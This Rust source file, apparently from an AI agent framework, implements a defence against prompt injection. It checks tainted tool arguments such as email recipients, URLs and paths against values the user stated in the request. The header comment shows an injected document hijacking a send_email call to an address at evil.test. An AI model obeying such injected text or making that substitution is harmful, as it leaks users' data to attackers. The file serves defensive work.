//! Constraints the *user* stated, which an untrusted source may not contradict.
//!
//! # The problem this solves
//!
//! `send_email(to = "attacker@evil.test")` and `send_email(to = "bob@example.com")`
//! are structurally identical. Both are tainted strings, both sit in the same
//! argument, and nothing in the type system or the label distinguishes "the
//! document told me the recipient" from "the document hijacked the recipient".
//!
//! That indistinguishability is why so much of this design ended up asking a
//! human. Seventeen of the thirty-three corpus attacks reach a prompt because
//! the automatic defence cannot tell those two cases apart, and asking a person
//! is not a defence — it is an admission that one was needed.
//!
//! # The observation that does distinguish them
//!
//! The user's request is **trusted text they typed**. "Email the invoice to
//! bob@example.com" contains an address the user chose. If the plan then places
//! a *different* address, lifted from a document, in that position, the document
//! has overridden something the user stated.
//!
//! That is a contradiction between two values, both of which the system already
//! holds. It needs no understanding of what an injection *says* — it works on
//! shape alone, so it is not detection and cannot be evaded by rephrasing.
//!
//! # What this does and does not claim
//!
//! **Does:** turn the most common attack — a document substituting a recipient,
//! a path, or a URL the user explicitly named — into an automatic `Deny` with no
//! human involved.
//!
//! **Does not:** eliminate the prompt. A request that pins nothing of a given
//! shape ("send it to the address in the document") has no constraint to enforce,
//! and something genuinely novel still needs a person. The design goal is that
//! prompts become the *exception* rather than the load-bearing path.
//!
//! It also does not attempt to be clever about meaning. Matching is on shape:
//! "this looks like an email address". A document that hijacks the recipient by
//! putting a *path* where an address was pinned is not caught here, and should
//! not be assumed to be.

use agentos_dsl::PlanData;
use agentos_types::Val;

/// Values the user stated explicitly, extracted from a trusted request.
///
/// Built once per session from the request text. Never from a document — a pin
/// built from untrusted input would be an attacker choosing their own
/// constraints.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct IntentPins {
    emails: Vec<String>,
    urls: Vec<String>,
    paths: Vec<String>,
    /// Values the request put in quotes, which are the most explicit statement a
    /// request can make.
    quoted: Vec<String>,
}

impl IntentPins {
    /// Extract pins from the user's request.
    ///
    /// No pins is a valid, common outcome and means only that the request stated
    /// nothing this module can act on.
    pub fn from_request(request: &str) -> Self {
        let mut pins = Self::default();
        for token in request.split(|c: char| c.is_whitespace() || c == ',' || c == ';') {
            let token = token.trim_matches(|c: char| {
                c.is_whitespace() || matches!(c, '.' | ',' | ';' | ':' | '!' | '?')
            });
            if token.is_empty() {
                continue;
            }
            if looks_like_email(token) {
                pins.emails.push(token.to_ascii_lowercase());
            } else if looks_like_url(token) {
                pins.urls.push(token.to_string());
            } else if looks_like_absolute_path(token) {
                pins.paths.push(token.to_string());
            }
            // A quoted span is recorded whatever it is: quoting is the most
            // deliberate thing a request can do, so it constrains regardless of
            // shape.
            for inner in quoted_spans(request) {
                pins.quoted.push(inner);
            }
        }
        pins.emails.sort();
        pins.emails.dedup();
        pins.urls.sort();
        pins.urls.dedup();
        pins.paths.sort();
        pins.paths.dedup();
        pins.quoted.sort();
        pins.quoted.dedup();
        pins
    }

    /// Whether the user stated anything at all this module can check.
    pub fn is_empty(&self) -> bool {
        self.emails.is_empty() && self.urls.is_empty() && self.paths.is_empty()
    }

    /// How many pins of each kind, for reporting.
    pub fn counts(&self) -> (usize, usize, usize) {
        (self.emails.len(), self.urls.len(), self.paths.len())
    }

    /// Whether `value` contradicts a pin, and why.
    ///
    /// Returns `None` when the value is consistent with everything the user
    /// said, **and** when the user pinned nothing of that shape. The second case
    /// matters as much as the first: inventing a constraint the user never
    /// expressed would deny legitimate work, and a denial nobody asked for is its
    /// own kind of wrong.
    pub fn contradiction(&self, value: &Val<PlanData>) -> Option<String> {
        let text: Option<String> = value.with_label_for_display(|data, label| {
            // Only tainted values are checked. A trusted value came from the plan's
            // own literals or from a confirmation the user already granted, and
            // re-litigating it would deny things the user approved.
            if label.is_trusted() {
                return None;
            }
            match data {
                PlanData::Str(s) | PlanData::Quoted { text: s, .. } => Some(s.clone()),
                _ => None,
            }
        });
        let text = text?;

        let candidate = text.trim();
        if candidate.is_empty() {
            return None;
        }

        if looks_like_email(candidate) {
            if !self.emails.is_empty() && !self.emails.contains(&candidate.to_ascii_lowercase()) {
                return Some(format!(
                    "recipient `{candidate}` contradicts the address the user stated ({})",
                    self.emails.join(", ")
                ));
            }
            return None;
        }
        if looks_like_url(candidate) {
            if !self.urls.is_empty() && !self.urls.iter().any(|u| u == candidate) {
                return Some(format!(
                    "url `{candidate}` contradicts the one the user stated ({})",
                    self.urls.join(", ")
                ));
            }
            return None;
        }
        if looks_like_absolute_path(candidate) {
            if !self.paths.is_empty() && !self.paths.iter().any(|p| p == candidate) {
                return Some(format!(
                    "path `{candidate}` contradicts the one the user stated ({})",
                    self.paths.join(", ")
                ));
            }
            return None;
        }
        None
    }
}

/// An email address: one `@`, something either side, and a dot in the domain.
///
/// Deliberately loose. A stricter rule would miss `mailto:` forms and unusual but
/// legitimate addresses, and a loose one produces at most a missed constraint,
/// which falls back to the prompt.
fn looks_like_email(s: &str) -> bool {
    if s.contains("://") {
        return false;
    }
    let parts: Vec<&str> = s.split('@').collect();
    let [local, domain] = parts.as_slice() else {
        return false;
    };
    !local.is_empty() && domain.contains('.') && !domain.contains(char::is_whitespace)
}

/// A URL with a scheme.
fn looks_like_url(s: &str) -> bool {
    s.contains("://") && !s.contains(char::is_whitespace)
}

/// An absolute filesystem path.
fn looks_like_absolute_path(s: &str) -> bool {
    s.starts_with('/') && s.len() > 1 && !s.contains(char::is_whitespace)
}

/// Spans the request put in double quotes.
fn quoted_spans(request: &str) -> Vec<String> {
    let mut spans = Vec::new();
    let mut chars = request.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '"' {
            continue;
        }
        let mut inner = String::new();
        let mut closed = false;
        for c in chars.by_ref() {
            if c == '"' {
                closed = true;
                break;
            }
            inner.push(c);
        }
        if closed && !inner.is_empty() {
            spans.push(inner);
        }
    }
    spans
}